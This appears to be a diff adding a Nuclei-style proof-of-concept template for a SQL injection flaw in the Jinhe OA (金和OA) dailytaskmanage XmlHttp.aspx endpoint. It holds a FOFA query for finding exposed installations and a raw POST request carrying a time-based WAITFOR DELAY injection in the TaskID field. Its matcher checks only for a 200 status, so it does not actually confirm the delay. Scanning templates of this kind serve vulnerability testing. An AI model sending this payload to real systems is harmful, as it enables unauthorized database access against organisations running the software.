@@ -1,0 +1,26 @@
+id: poc-mxkr14iugbqmoa6c
+info:
+  name: 金和OA dailytaskmanage XmlHttp.aspx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mxkr14iugbqmoa6c'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mxkr14iugbqmoa6c
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/Jhsoft.Web.dailytaskmanage/XmlHttp.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/xml
+
+
+    <root><Flag>CheckTask</Flag><TaskID>-1''WAITFOR/**/DELAY''0:0:5</TaskID></root>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
